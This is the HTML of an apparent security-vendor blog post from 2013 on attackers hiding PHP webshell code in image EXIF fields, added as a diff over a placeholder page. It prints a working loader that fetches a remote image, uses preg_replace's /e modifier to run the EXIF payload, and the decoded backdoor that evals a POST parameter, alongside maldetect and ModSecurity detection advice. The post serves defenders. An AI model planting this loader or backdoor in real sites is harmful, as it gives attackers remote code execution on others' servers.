@@ -1,1 +1,174 @@
-cooming soon...
+<div class="col-sm-7">
+                        <main>
+                            <article itemtype="http://schema.org/BlogPosting" itemscope="itemscope" class="blog-post">
+		                        <header class="entry-header">
+                                    <h2 class="entry-title">Hiding Webshell Backdoor Code in Image Files
+</h2>
+		                            <ul class="entry-meta list-inline">
+			                            <li itemprop="datePublished">
+                                            October 11, 2013
+			                            </li>
+			                            <li itemprop="author">
+				                            <div itemtype="http://schema.org/Person" itemscope="itemscope">
+					                            Posted By <span itemprop="name">Ryan Barnett</span>
+				                            </div>
+			                            </li>
+			                            <li>
+				                           Comments <a href="#">(0)</a> <i class="fa fa-comments-o"></i> 
+                                        </li>
+						            </ul>
+                                </header>
+
+                                <div class="blog-share-buttons hidden-xs">
+                                    
+
+<div class="share-buttons">
+    <p>Share:</p>
+    <ul class="share-button-list addthis_toolbox" addthis:url="https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/" addthis:title="Hiding Webshell Backdoor Code in Image Files" addthis:description="Looks Can Be Deceiving Do any of these pictures look suspicious? First appearances may be deceiving... Web attackers have have been using a method of stashing pieces of their PHP backdoor exploit code within the meta-data headers of these image...">
+        <li>
+            <a class="share-button addthis_button_linkedin" href="https://www.addthis.com/bookmark.php?v=300&amp;winname=addthis&amp;pub=ra-5286e9523a723348&amp;source=tbx-300&amp;lng=en-US&amp;s=linkedin&amp;url=https%3A%2F%2Fwww.trustwave.com%2FResources%2FSpiderLabs-Blog%2FHiding-Webshell-Backdoor-Code-in-Image-Files%2F&amp;title=Hiding%20Webshell%20Backdoor%20Code%20in%20Image%20Files&amp;ate=AT-ra-5286e9523a723348/-/-/54f6cd2ef50d7e45/3&amp;frommenu=1&amp;uid=54f6cd2e79a3b2fe&amp;description=Looks%20Can%20Be%20Deceiving%20Do%20any%20of%20these%20pictures%20look%20suspicious%3F%20First%20appearances%20may%20be%20deceiving...%20Web%20attackers%20have%20have%20been%20using%20a%20method%20of%20stashing%20pieces%20of%20their%20PHP%20backdoor%20exploit%20code%20within%20the%20meta-data%20headers%20of%20these%20image...&amp;ct=1&amp;pre=https%3A%2F%2Fwww.google.com%2Furl%3Fsa%3Dt%26rct%3Dj%26q%3D%26esrc%3Ds%26source%3Dweb%26cd%3D2%26cad%3Drja%26uact%3D8%26ved%3D0CCQQFjAB%26url%3Dhttps%253A%252F%252Fwww.trustwave.com%252FResources%252FSpiderLabs-Blog%252FHiding-Webshell-Backdoor-Code-in-Image-Files%252F%26ei%3D8LL0VNzoDoOWygPs34GIBg%26usg%3DAFQjCNFCzpw5fuPPQx9Gc8vV7sbzF3nzbw%26bvm%3Dbv.87269000%2Cd.bGQ&amp;tt=0&amp;captcha_provider=nucaptcha" target="_blank" title="LinkedIn">
+                <span class="share-icon"><i class="fa fa-linkedin"></i></span>
+                <span class="share-text">LinkedIn</span>
+            </a>
+        </li>
+        <li>
+            <a class="share-button addthis_button_facebook" href="#" title="Facebook">
+                <span class="share-icon"><i class="fa fa-facebook"></i></span>
+                <span class="share-text">Facebook</span>
+            </a>
+        </li>
+        <li>
+            <a class="share-button addthis_button_twitter" href="#" title="Tweet">
+                <span class="share-icon"><i class="fa fa-twitter"></i></span>
+                <span class="share-text">Twitter</span>
+            </a>
+        </li>
+        <li>
+            <a class="share-button addthis_button_email" href="#" target="_blank" title="Email">
+                <span class="share-icon"><i class="fa fa-envelope-o"></i></span>
+                <span class="share-text">Email</span>
+            </a>
+        </li>
+    <div class="atclear"></div></ul>
+</div>
+						        </div>
+
+						        <div class="entry-content">
+                                    <h3>Looks Can Be Deceiving</h3>
+<p>Do any of these pictures look suspicious?</p>
+<p><a style="display: inline;" href="http://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff2c407970d-pi" class="asset-img-link fancyboxSpiders" rel="SpiderFancyImages"><img border="0" title="Screen Shot 2013-10-11 at 3.39.08 PM" src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff2c407970d-800wi" class="asset  asset-image at-xid-6a0133f264aa62970b019afff2c407970d image-full img-responsive" alt="Screen Shot 2013-10-11 at 3.39.08 PM"></a><br><br></p>
+<p>First appearances may be deceiving...  Web attackers have have been using a method of stashing pieces of their PHP backdoor exploit code within the meta-data headers of these image files to evade detections.  This is not a completely new tactic however it is not as well known by the defensive community so we want to raise awareness.  Let's first take a quick look at why this technique is being utlized by attackers.</p>
+<h3>Standard Webshell Backdoor Code</h3>
+<p>There are many methods attackers employ to upload Webshell backdoor code onto compromised web servers including <a target="_self" href="http://blog.spiderlabs.com/2011/09/modsecurity-advanced-topic-of-the-week-remote-file-inclusion-attack-detection.html">Remote File Inclusion (RFI)</a>, <a target="_self" href="http://blog.spiderlabs.com/2011/11/wordpress-timthumb-attacks-rising.html">Wordpress TimThumb Plugin</a> and even non-web attack vectors such as Stolen FTP Credentials.  Here is a graphic taken from this years Trustwave SpiderLabs Global Security Report that lists the top malicious file types uploaded to compromised web servers:</p>
+<p><a style="display: inline;" href="http://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff1ac30970d-pi" class="asset-img-link fancyboxSpiders" rel="SpiderFancyImages"><img title="MaliciousRFI_graphic" src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff1ac30970d-500wi" class="asset  asset-image at-xid-6a0133f264aa62970b019afff1ac30970d img-responsive" alt="MaliciousRFI_graphic"></a><br>Let's take a look at a standard obfuscated R57 shell example:</p>
+<p><a style="display: inline;" href="http://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff144fc970b-pi" class="asset-img-link fancyboxSpiders" rel="SpiderFancyImages"><img border="0" title="Screen Shot 2013-10-11 at 12.26.17 PM" src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff144fc970b-800wi" class="asset  asset-image at-xid-6a0133f264aa62970b019afff144fc970b image-full img-responsive" alt="Screen Shot 2013-10-11 at 12.26.17 PM"></a><br><br>Notice the Base64 encoded parameter data and then the PHP Eval call at the end.  Once PHP executes this code, it will decode and inflate the data stream and the result will be a basic file uploader webshell similar to the following:</p>
+<p><a style="display: inline;" href="http://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff147ba970c-pi" class="asset-img-link fancyboxSpiders" rel="SpiderFancyImages"><img border="0" title="Screen Shot 2013-10-11 at 12.28.17 PM" src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff147ba970c-800wi" class="asset  asset-image at-xid-6a0133f264aa62970b019afff147ba970c image-full img-responsive" alt="Screen Shot 2013-10-11 at 12.28.17 PM"></a></p>
+<h3>Incident Response Steps - Identification and Eradication  </h3>
+<p>These types of attacks and compromises are so prevalent in Shared Hosting environments where end users do not properly update their web application software.  In response to these types of scenarios, Hosting Provider security teams often employ OS-level back-end processes that scan the local file systems looking for tell-tale signs of webshell backdoor code.  One example tool is called <a target="_self" href="http://www.rfxn.com/projects/linux-malware-detect/">MalDetect</a>.  This script can be run to analyze files and detect various forms of malicious code.  If we run maldetect against our example R57 webshell file we get the following:</p>
+<pre><span style="background-color: #ffff00;"><strong>$ sudo /usr/local/maldetect/maldet --config-option quar_hits=0,quar_clean=0,clamav_scan=1 -a "/tmp/lin.php"</strong></span><br>Linux Malware Detect v1.4.2<br>            (C) 2002-2013, R-fx Networks &lt;proj@r-fx.org&gt;<br>            (C) 2013, Ryan MacDonald &lt;ryan@r-fx.org&gt;<br>inotifywait (C) 2007, Rohan McGovern &lt;rohan@mcgovern.id.au&gt;<br>This program may be freely redistributed under the terms of the GNU GPL v2<br><br>maldet(92294): {scan} signatures loaded: 9011 (7145 MD5 / 1866 HEX)<br>maldet(92294): {scan} building file list for /tmp/lin.php, this might take awhile...<br>maldet(92294): {scan} file list completed, found 1 files...<br>maldet(92294): {scan} 1/1 files scanned: 0 hits 0 cleaned<br><span style="background-color: #ffff00;"><strong>maldet(92294): {scan} scan completed on /tmp/lin.php: files 1, malware hits 1, cleaned hits 0</strong></span><br><span style="background-color: #ffff00;"><strong>maldet(92294): {scan} scan report saved, to view run: maldet --report 101113-1250.92294</strong></span><br>maldet(92294): {scan} quarantine is disabled! set quar_hits=1 in conf.maldet or to quarantine results run: maldet -q 101113-1250.92294<span style="background-color: #ffff00;"><strong>$ sudo maldet --report 101113-1250.92294</strong></span>malware detect scan report for MacBook-Pro-2.local:SCAN ID: 101113-1250.92294TIME: Oct 11 12:50:48 -0400PATH: /tmp/lin.phpTOTAL FILES: 1TOTAL HITS: 1TOTAL CLEANED: 0NOTE: quarantine is disabled! set quar_hits=1 in conf.maldet or to quarantine results run: maldet -q 101113-1250.92294FILE HIT LIST:<span style="background-color: #ffff00;"><strong>{MD5}base64.inject.unclassed.1 : /tmp/lin.php</strong></span>===============================================Linux Malware Detect v1.4.2 &lt; proj@rfxn.com &gt;</pre>
+<p> As you can see, maldetect identified this PHP file with of of its generic base64 injection signatures.  While this indivudual file scanning does work, for managability, most organizations opt to run maldetect as part of an ogoing automated process run through scheduling tools such as Cron.  The big problem with this process is that, for performance reasons, many organizations opt to only scan PHP files and exclude other file types from being scanned...</p>
+<h3>Hiding Webshell Backdoor Code in Image Files </h3>
+<p> This brings us back to the beginning of the blog post.  Due to the cleanup tactics used by most organizations, the bad guys had to figure out a method of hiding their backdoor code in places that most likely would not be inspected.  In this case, we are talking about hiding PHP code data within the <a target="_self" href="http://en.wikipedia.org/wiki/Exchangeable_image_file_format">Exif image header fields</a>.  The concept of Stegonography is not new and there have been many past examples of its use for passing data, however we are now seeing it used for automated code execution.  I do want to give a proper hat-tip to the <a target="_self" href="http://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html">Sucuri Research Team who also found similar techniques</a> being employed.</p>
+<h4>PHP Code In EXIF Headers</h4>
+<p>If you were to view-source in a browser or use something like the unix strings command, you could see the new code added to the top of the image files:</p>
+<p><a style="display: inline;" href="http://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff191b5970b-pi" class="asset-img-link fancyboxSpiders" rel="SpiderFancyImages"><img border="0" title="Screen Shot 2013-10-11 at 1.10.12 PM" src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff191b5970b-800wi" class="asset  asset-image at-xid-6a0133f264aa62970b019afff191b5970b image-full img-responsive" alt="Screen Shot 2013-10-11 at 1.10.12 PM"></a><br><br></p>
+<p>After uploading this file to <a target="_self" href="https://www.virustotal.com/en/file/ab85eb33605f3013989f4e8a9bfd5e89dd82d1f80231d4e4a2ceb82744bf287c/analysis/1381324711/">VirusTotal</a>, you can see a more friendly representation of the EXIF fields:</p>
+<p><a style="display: inline;" href="http://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff192ae970c-pi" class="asset-img-link fancyboxSpiders" rel="SpiderFancyImages"><img border="0" title="Screen Shot 2013-10-11 at 1.18.14 PM" src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff192ae970c-800wi" class="asset  asset-image at-xid-6a0133f264aa62970b019afff192ae970c image-full img-responsive" alt="Screen Shot 2013-10-11 at 1.18.14 PM"></a></p>
+<p>As you can see, the PHP code is held within the EXIF "Model" and "Make" fields.  This data does not in any way interfere with the proper rendering of the image file itself.</p>
+<h4>PHP's exif_read_data function</h4>
+<p>PHP has a function called <a target="_self" href="http://php.net/manual/en/function.exif-read-data.php">exif_read_data</a> which allows it to read the header data of image files.  It is used <a target="_self" href="https://github.com/search?q=exif_read_data%28&amp;ref=cmdform&amp;type=Code">extensivly in many different plugins and tools</a>.  Here is an example from Facebook's GitHub Repo:</p>
+<p><a style="display: inline;" href="http://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff1b402970c-pi" class="asset-img-link fancyboxSpiders" rel="SpiderFancyImages"><img border="0" title="Screen Shot 2013-10-11 at 1.41.34 PM" src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff1b402970c-800wi" class="asset  asset-image at-xid-6a0133f264aa62970b019afff1b402970c img-responsive" alt="Screen Shot 2013-10-11 at 1.41.34 PM"></a></p>
+<h4>Updated PHP Webshell Code</h4>
+<p>So, with pieces of their webshell stashes away within the EXIF headers of either local or remote image files, the attackers can then modify their PHP code to leverage the PHP exif_read_data function like this:</p>
+<pre>&lt;?php$exif = exif_read_data('http://REDACTED/images/stories/Logo_Coveright.jpg');preg_replace($exif['Make'],$exif['Model'],'');?&gt;</pre>
+<p>The first line downloads a remote jpg image file with the stashes code in it and then sets the $exif variable with the array value.  We can modify this PHP code to simulate this by downloading the same files and then dumping the $exif data:</p>
+<pre>&lt;?$exif = exif_read_data('http://REDACTED/images/stories/Logo_Coveright.jpg');<br>var_dump($exif);<br>?&gt;</pre>
+<p>When executing this php file, we get the following output:</p>
+<pre><span style="background-color: #ffff00;"><strong>$ php ./exif_dumper.php</strong></span><br>array(9) {<br>  ["FileName"]=&gt;<br>  string(18) "Logo_Coveright.jpg"<br>  ["FileDateTime"]=&gt;<br>  int(0)<br>  ["FileSize"]=&gt;<br>  int(6159)<br>  ["FileType"]=&gt;<br>  int(2)<br>  ["MimeType"]=&gt;<br>  string(10) "image/jpeg"<br>  ["SectionsFound"]=&gt;<br>  string(13) "ANY_TAG, IFD0"<br>  ["COMPUTED"]=&gt;<br>  array(5) {<br>    ["html"]=&gt;<br>    string(23) "width="155" height="77""<br>    ["Height"]=&gt;<br>    int(77)<br>    ["Width"]=&gt;<br>    int(155)<br>    ["IsColor"]=&gt;<br>    int(1)<br>    ["ByteOrderMotorola"]=&gt;<br>    int(0)<br>  }<br><span style="background-color: #ffff00;"><strong>["Make"]=&gt;</strong></span><br><span style="background-color: #ffff00;"><strong>  string(5) "/.*/e"</strong></span><br><span style="background-color: #ffff00;"><strong>  ["Model"]=&gt;</strong></span><br><span style="background-color: #ffff00;"><strong>  string(108) "eval(base64_decode('aWYgKGlzc2V0KCRfUE9TVFsienoxIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30='));"</strong></span><br>}<br></pre>
+<p>The final setup in this process is to execute the PHP <a target="_self" href="http://php.net/manual/en/function.preg-replace.php">preg_replace</a> function.</p>
+<pre>&lt;?php$exif = exif_read_data('http://REDACTED/images/stories/Logo_Coveright.jpg');<span style="background-color: #ffff00;"><strong>preg_replace($exif['Make'],$exif['Model'],'');</strong></span>?&gt;</pre>
+<p>Notice that the $exif['Make'] variable data uses the "/.*/e" PCRE regex modifier (PREG_REPLACE_EVAL) which will evaluate the data from the $exif['Model'] variable.  In this case, it would execute the base64_decode which results in the following PHP snippet of code:</p>
+<pre>if (isset($_POST["zz1"])) {eval(stripslashes($_POST["zz1"]));}</pre>
+<p>This code checks to see if there is a POST request body named "zz1" and if there is, it will then eval the contents.  This makes it quite easy for attackers to sprinkle backdoor access code by injecting other legitimate PHP files with this combination of exif_read_data and preg_replace code. </p>
+<h3>How Widespread?</h3>
+<p>We can not accurately estimate how widespread this technique is being used however there is a small amount of empirical evidence by simply using public search engines to flag any web pages that list characteristics of either EXIF code hiding or searching for this specific base64 encoded string value.</p>
+<p><a style="display: inline;" href="http://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff235a2970c-pi" class="asset-img-link fancyboxSpiders" rel="SpiderFancyImages"><img border="0" title="Screen Shot 2013-10-11 at 2.24.03 PM" src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b019afff235a2970c-800wi" class="asset  asset-image at-xid-6a0133f264aa62970b019afff235a2970c image-full img-responsive" alt="Screen Shot 2013-10-11 at 2.24.03 PM"></a><br>There are hundreds of examples of this base64 encoded data being present within image files.</p>
+<h3>Recommendations</h3>
+<h4>Scan All Files for Malicious Code</h4>
+<p>If you are running OS level scanning of files on disk, carefully consider which file-types you want to include/exclude.  As this scenario shows, attackers can take advantage of your excluded content to hide their code.</p>
+<h4>Scan Files During Attachment Uploading using ModSecurity</h4>
+<p>When end users are uploading images as file attachments, ModSecurity has the ability to:</p>
+<ol><li>Extract the file and dump it to a tmp file on disk</li><li>Execute the <a target="_self" href="https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual#wiki-inspectFile">@inspectFile</a> operator to analyze the file</li><li>Block uploading if malware is found</li></ol>
+<p>The maldetect <a target="_self" href="http://www.rfxn.com/appdocs/README.maldetect">README</a> file even includes instructions on how to integrate it with ModSecurity:</p>
+<pre>.: 12 [ MODSECURITY2 UPLOAD SCANNING ]The support for HTTP upload scanning is provided through mod_security2's inspectFile hook.This feature allows for a validation script to be used in permitting or denying an upload. The convenience script to faciliate this is called modsec.sh and is located in the/usr/local/maldetect installation path. The default setup is to run a standard maldet scanwith no clamav support, no cleaner rule executions and quarantining enabled; these optionsare set in the interest of performance vs accuracy which is a fair tradeoff. The scan options can be modified in the modsec.sh file if so desired, the defaultscan options are as follows:--config-option quar_hits=1,quar_clean=0,clamav_scan=0 --modsec -a "$file"There is a tangible performance difference in disabling clamav scanning in this usagescenario. The native LMD scanner engine is much faster than the clamav scanner enginein single file scans by a wide margin. A single file scan using clamav takes roughly3sec on average while the LMD scanner engine takes 0.5sec or less.To enable upload scanning with mod_security2 you must set enable the public_scan optionin conf.maldet (public_scan=1) then add the following rules to your mod_security2 configuration. These rules are best placed in your modsec2.user.conf file on cpanel serversor at the top of the appropraite rules file for your setup./usr/local/apache/conf/modsec2.user.conf (or similar mod_security2 rules file):SecRequestBodyAccess OnSecRule FILES_TMPNAMES "@inspectFile /usr/local/maldetect/modsec.sh" \                "log,auditlog,deny,severity:2,phase:2,t:none"A restart of the HTTPd service is required following these changes.When an upload takes place that is determined to be malware, it will be rejected and anentry will appear in the mod_security2 SecAuditLog file. On cpanel servers and mostconfigurations this is the modsec_audit.log located under /usr/local/apache/logs or /var/log/httpd.The log entry will appear similar to the following:</pre>
+<pre>Message: Access denied with code 406 (phase 2). File "/tmp/20111120-....-file" rejected bythe approver script "/usr/local/maldetect/modsec.sh": 0 maldet: {HEX}php.cmdshell.r57.317/tmp/20111120-....-file [file "/usr/local/apache/conf/modsec2.user.conf"] [line "3"][severity "CRITICAL"]</pre>
+
+							    </div>
+
+                                <div class="entry-footer">
+                                    <div class="blog-share-buttons">
+                                        
+
+<div class="share-buttons">
+    <p>Share:</p>
+    <ul class="share-button-list addthis_toolbox" addthis:url="https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/" addthis:title="Hiding Webshell Backdoor Code in Image Files" addthis:description="Looks Can Be Deceiving Do any of these pictures look suspicious? First appearances may be deceiving... Web attackers have have been using a method of stashing pieces of their PHP backdoor exploit code within the meta-data headers of these image...">
+        <li>
+            <a class="share-button addthis_button_linkedin" href="https://www.addthis.com/bookmark.php?v=300&amp;winname=addthis&amp;pub=ra-5286e9523a723348&amp;source=tbx-300&amp;lng=en-US&amp;s=linkedin&amp;url=https%3A%2F%2Fwww.trustwave.com%2FResources%2FSpiderLabs-Blog%2FHiding-Webshell-Backdoor-Code-in-Image-Files%2F&amp;title=Hiding%20Webshell%20Backdoor%20Code%20in%20Image%20Files&amp;ate=AT-ra-5286e9523a723348/-/-/54f6cd2ef50d7e45/4&amp;frommenu=1&amp;uid=54f6cd2e7e4e7e7c&amp;description=Looks%20Can%20Be%20Deceiving%20Do%20any%20of%20these%20pictures%20look%20suspicious%3F%20First%20appearances%20may%20be%20deceiving...%20Web%20attackers%20have%20have%20been%20using%20a%20method%20of%20stashing%20pieces%20of%20their%20PHP%20backdoor%20exploit%20code%20within%20the%20meta-data%20headers%20of%20these%20image...&amp;ct=1&amp;pre=https%3A%2F%2Fwww.google.com%2Furl%3Fsa%3Dt%26rct%3Dj%26q%3D%26esrc%3Ds%26source%3Dweb%26cd%3D2%26cad%3Drja%26uact%3D8%26ved%3D0CCQQFjAB%26url%3Dhttps%253A%252F%252Fwww.trustwave.com%252FResources%252FSpiderLabs-Blog%252FHiding-Webshell-Backdoor-Code-in-Image-Files%252F%26ei%3D8LL0VNzoDoOWygPs34GIBg%26usg%3DAFQjCNFCzpw5fuPPQx9Gc8vV7sbzF3nzbw%26bvm%3Dbv.87269000%2Cd.bGQ&amp;tt=0&amp;captcha_provider=nucaptcha" target="_blank" title="LinkedIn">
+                <span class="share-icon"><i class="fa fa-linkedin"></i></span>
+                <span class="share-text">LinkedIn</span>
+            </a>
+        </li>
+        <li>
+            <a class="share-button addthis_button_facebook" href="#" title="Facebook">
+                <span class="share-icon"><i class="fa fa-facebook"></i></span>
+                <span class="share-text">Facebook</span>
+            </a>
+        </li>
+        <li>
+            <a class="share-button addthis_button_twitter" href="#" title="Tweet">
+                <span class="share-icon"><i class="fa fa-twitter"></i></span>
+                <span class="share-text">Twitter</span>
+            </a>
+        </li>
+        <li>
+            <a class="share-button addthis_button_email" href="#" target="_blank" title="Email">
+                <span class="share-icon"><i class="fa fa-envelope-o"></i></span>
+                <span class="share-text">Email</span>
+            </a>
+        </li>
+    <div class="atclear"></div></ul>
+</div>
+						            </div>
+
+                                    
+        <p>Tags:<span itemprop="keywords">
+    <a href="/Resources/SpiderLabs-Blog/?page=1&amp;year=0&amp;month=0&amp;tag=Application+Security">Application Security</a>, <a href="/Resources/SpiderLabs-Blog/?page=1&amp;year=0&amp;month=0&amp;tag=Incident+Response">Incident Response</a>, <a href="/Resources/SpiderLabs-Blog/?page=1&amp;year=0&amp;month=0&amp;tag=ModSecurity">ModSecurity</a>, <a href="/Resources/SpiderLabs-Blog/?page=1&amp;year=0&amp;month=0&amp;tag=ModSecurity+Rules">ModSecurity Rules</a>, <a href="/Resources/SpiderLabs-Blog/?page=1&amp;year=0&amp;month=0&amp;tag=Security+Research">Security Research</a>
+        </span></p>
+             
+                                </div>
+                            </article>
+                            <div class="blog-comments">
+                                
+
+<div id="disqus_thread"><iframe width="100%" frameborder="0" id="dsq-2" data-disqus-uid="2" allowtransparency="true" scrolling="no" tabindex="0" title="Disqus" style="width: 100% ! important; border: medium none ! important; overflow: hidden ! important; height: 634px ! important;" src="https://disqus.com/embed/comments/?base=default&amp;version=880eeb1d4f1b501bfb01ba194bbd8175&amp;f=trustwaveholdingsinc&amp;t_i=4496&amp;t_u=https%3A%2F%2Fwww.trustwave.com%2FResources%2FSpiderLabs-Blog%2FHiding-Webshell-Backdoor-Code-in-Image-Files%2F&amp;t_d=Hiding%20Webshell%20Backdoor%20Code%20in%20Image%20Files&amp;t_t=Hiding%20Webshell%20Backdoor%20Code%20in%20Image%20Files&amp;s_o=default#2" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
+
+<script>
+
+    var disqus_identifier = '4496';
+
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'trustwaveholdingsinc'; // required: replace example with your forum shortname
+
+    var disqus_url = 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+</script>   
+                            </div>
+                        </main>
+			        </div>
